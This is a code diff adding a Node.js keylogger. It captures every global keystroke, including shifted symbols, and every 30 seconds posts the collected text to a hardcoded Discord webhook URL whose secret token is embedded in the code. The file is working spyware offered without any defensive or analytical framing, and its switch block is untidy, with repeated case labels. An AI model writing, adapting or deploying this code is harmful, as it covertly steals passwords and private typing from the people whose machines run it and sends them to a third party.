@@ -1,0 +1,277 @@
+//import {GlobalKeyboardListener} from "node-global-key-listener";
+
+const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener
+const axios = require('axios')
+
+
+const v = new GlobalKeyboardListener();
+
+var l_shift_dn = false
+var l_alt_dn = false
+var r_shift_dn = false
+var r_alt_dn = false
+var keylogs = '';
+
+//Log every key that's pressed.
+v.addListener(function (e, down) {
+    // console.log(
+    //     `${e.name} ${e.state == "DOWN" ? "DOWN" : "UP  "} [${e.rawKey._nameRaw}]`
+    // )
+    if (e.state == "UP") {
+        switch (e.name) {
+            case 'DOT':
+                process.stdout.write('.');
+                keylogs += '.';               
+                break;          
+            case '1':
+                    if (l_shift_dn || r_shift_dn) {
+                        process.stdout.write('!');
+                        keylogs += '!';
+                    } else {
+                        process.stdout.write('1');
+                        keylogs += '1';
+                    }
+                    break;
+                    case 'RIGHT SHIFT':
+                        r_shift_dn = false;
+                        break;
+                    case 'LEFT SHIFT':
+                        l_shift_dn = false; 
+                        break;
+            case '2':
+                    if (l_shift_dn || r_shift_dn) {
+                        process.stdout.write('@');
+                        keylogs += '@';
+                    } else {
+                        process.stdout.write('2');
+                        keylogs += '2';
+                    }
+                    break;
+                    case 'RIGHT SHIFT':
+                        r_shift_dn = false;
+                        break;
+                    case 'LEFT SHIFT':
+                        l_shift_dn = false; 
+                        break;
+            case '2':
+                    if (l_shift_dn || r_shift_dn) {
+                        process.stdout.write('@');
+                        keylogs += '@';
+                    } else {
+                        process.stdout.write('2');
+                        keylogs += '2';
+                    }
+                    break;
+                    case 'RIGHT SHIFT':
+                        r_shift_dn = false;
+                        break;
+                    case 'LEFT SHIFT':
+                        l_shift_dn = false; 
+                        break;
+            case '3':
+                    if (l_shift_dn || r_shift_dn) {
+                     process.stdout.write('#');
+                    keylogs += '#';
+                     } else {
+                     process.stdout.write('3');
+                     keylogs += '3';
+                     }
+                    break;
+                    case 'RIGHT SHIFT':
+                    r_shift_dn = false;
+                    break;
+                    case 'LEFT SHIFT':
+                    l_shift_dn = false; 
+                    break;
+            case '4':
+                   if (l_shift_dn || r_shift_dn) {
+                   process.stdout.write('$');
+                   keylogs += '$';
+                   } else {
+                   process.stdout.write('4');
+                   keylogs += '4';
+                   }
+                   break;
+                   case 'RIGHT SHIFT':
+                   r_shift_dn = false;
+                   break;
+                   case 'LEFT SHIFT':
+                   l_shift_dn = false; 
+                   break;
+            case '5':
+                   if (l_shift_dn || r_shift_dn) {
+                   process.stdout.write('%');
+                   keylogs += '%';
+                   } else {
+                   process.stdout.write('5');
+                   keylogs += '5';
+                   }
+                   break;
+                   case 'RIGHT SHIFT':
+                   r_shift_dn = false;
+                   break;
+                   case 'LEFT SHIFT':
+                   l_shift_dn = false; 
+                   break;
+            case '6':
+                    if (l_shift_dn || r_shift_dn) {
+                        process.stdout.write('^');
+                        keylogs += '^';
+                    } else {
+                        process.stdout.write('6');
+                        keylogs += '6';
+                    }
+                    break;
+                    case 'RIGHT SHIFT':
+                        r_shift_dn = false;
+                        break;
+                    case 'LEFT SHIFT':
+                        l_shift_dn = false; 
+                        break;  
+            case '7':
+                    if (l_shift_dn || r_shift_dn) {
+                        process.stdout.write('&');
+                        keylogs += '&';
+                    } else {
+                        process.stdout.write('7');
+                        keylogs += '7';
+                    }
+                    break;
+                    case 'RIGHT SHIFT':
+                        r_shift_dn = false;
+                        break;
+                    case 'LEFT SHIFT':
+                        l_shift_dn = false; 
+                        break;    
+            case '8':
+                if (l_shift_dn || r_shift_dn) {
+                 process.stdout.write('*');
+                 keylogs += '*';
+                 } else {
+                 process.stdout.write('8');
+                 keylogs += '8';
+                 }
+                break;
+                case 'RIGHT SHIFT':
+                r_shift_dn = false;
+                 break;
+                case 'LEFT SHIFT':
+                l_shift_dn = false; 
+                break; 
+            case '9':
+                if (l_shift_dn || r_shift_dn) {
+                process.stdout.write('(');
+                keylogs += '(';
+                } else {
+                process.stdout.write('9');
+                keylogs += '9';
+                }
+                break;
+                case 'RIGHT SHIFT':
+                r_shift_dn = false;
+                break;
+                case 'LEFT SHIFT':
+                l_shift_dn = false; 
+                break;
+            case '0':
+                if (l_shift_dn || r_shift_dn) {
+                process.stdout.write(')');
+                keylogs += ')';
+                } else {
+                process.stdout.write('0');
+                keylogs += '0';
+                }
+                break;
+                case 'RIGHT SHIFT':
+                r_shift_dn = false;
+                break;
+                case 'LEFT SHIFT':
+                l_shift_dn = false; 
+                break;
+            case 'TAB':
+                process.stdout.write('<TAB>');
+                keylogs += '<TAB>'
+                break;
+            case 'RETURN':
+                process.stdout.write('<ENTER>');
+                keylogs += '<ENTER>'
+                break;
+            case 'SPACE':
+                process.stdout.write(' ');
+                keylogs += ' '
+                break;
+            case 'ESCAPE':
+                process.stdout.write('<ESC>');
+                keylogs += '<ESC>'
+                break;
+            case 'DELETE':
+                process.stdout.write('<DEL>');
+                keylogs += '<DEL>'
+                break;
+            case 'BACKSPACE':
+                process.stdout.write('<B.SPACE>');
+                keylogs += '<B.SPACE>'
+                break;
+            // case 'LEFT SHIFT':
+            //     process.stdout.write('</L.SHIFT>');
+            //     keylogs += '</L.SHIFT>'
+            //     l_shift_dn = false
+            //     break;
+            case 'LEFT ALT':
+                process.stdout.write('</L.ALT>');
+                keylogs += '</L.ALT>'
+                break;
+            // case 'RIGHT SHIFT':
+            //     process.stdout.write('</R.SHIFT>');
+            //     keylogs += '</R.SHIFT>'
+            //     break;
+            case 'RIGHT ALT':
+                process.stdout.write('</R.ALT>');
+                keylogs += '</R.ALT>'
+                break;
+            default: 
+                process.stdout.write(e.name);
+                keylogs += e.name
+        }
+    }
+    if (e.state == "DOWN") {
+        switch (e.name) {
+
+            case 'LEFT SHIFT':
+                l_shift_dn = true; 
+                break;
+            case 'RIGHT SHIFT':
+                r_shift_dn = true; 
+                break;
+            // case 'LEFT SHIFT':
+            //     if (l_shift_dn == false) {
+            //         l_shift_dn = true
+            //         process.stdout.write('<L.SHIFT>');
+            //         keylogs += '<L.SHIFT>'
+            //     }
+            //     break;
+            case 'LEFT ALT':
+                process.stdout.write('<L.ALT>');
+                keylogs += '<L.ALT>'
+                break;
+            // case 'RIGHT SHIFT':
+            //     process.stdout.write('<R.SHIFT>');
+            //     keylogs += '<R.SHIFT>'
+            //     break;
+            
+            case 'RIGHT ALT':
+                process.stdout.write('<R.ALT>');
+                keylogs += '<R.ALT>'
+                break;
+        }
+    }
+});
+
+
+setInterval(async () => {
+    await axios.post('https://discord.com/api/webhooks/1235873075346538496/UwHFp88-UGc8dnRUjwHcsS21lWT3me81Uan1qYLzxc5WIOZQ1F_4Xv5PwpH99r2OgbPa', {
+        "content": keylogs
+    }).then(async () => {
+        keylogs = ''
+    })
+}, 1000 * 30);
